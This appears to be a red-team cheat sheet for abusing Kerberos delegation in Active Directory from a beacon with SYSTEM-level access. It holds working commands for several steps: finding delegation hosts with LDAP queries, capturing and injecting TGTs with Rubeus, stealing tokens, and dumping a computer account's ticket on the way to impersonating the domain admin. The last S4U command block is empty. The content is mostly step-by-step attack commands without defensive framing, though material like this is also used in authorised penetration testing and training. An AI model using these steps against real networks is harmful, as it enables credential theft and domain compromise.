
##### Unconstrained Delegation
Search for computers configured for Unconstrained Delegation
```powershell
ldapsearch (&(samAccountType=805306369 (userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

Within SYSTEM level beacon on Unconstrained Delegation host, monitor for incoming TGTs on host
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```

Stop Rubeus
```powershell
jobs
jobkill 0
```

Inject TGT into sacrificial logon session
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:
```

Impersonate spawned process and confirm
```powershell
steal_token [PID]
run klist

rev2self       <--- Drop impersonation
kill [PID]
```

##### Constrained Delegation
Search for computers with Constrained Delegation (`msDS-AllowedToDelegateTo` not set to null)
```powershell
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

Check the UAC value to see if protocol transitioning is possible (we want true)
```powershell
ldapsearch (&(samAccountType=805306369)(samaccountname=LON-WS-1$)) --attributes userAccountControl
```

```powershell
[Convert]::ToBoolean([UAC_Value] -band 16777216)
```

Within SYSTEM level beacon on Constrained Delegation host, dump TGT for the computer account
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7  /service:krbtgt /nowrap
```

Perform the S4U abuse to obtain a usable service ticket for _cifs/lon-fs-1_, impersonating the default domain admin.
```powershell

```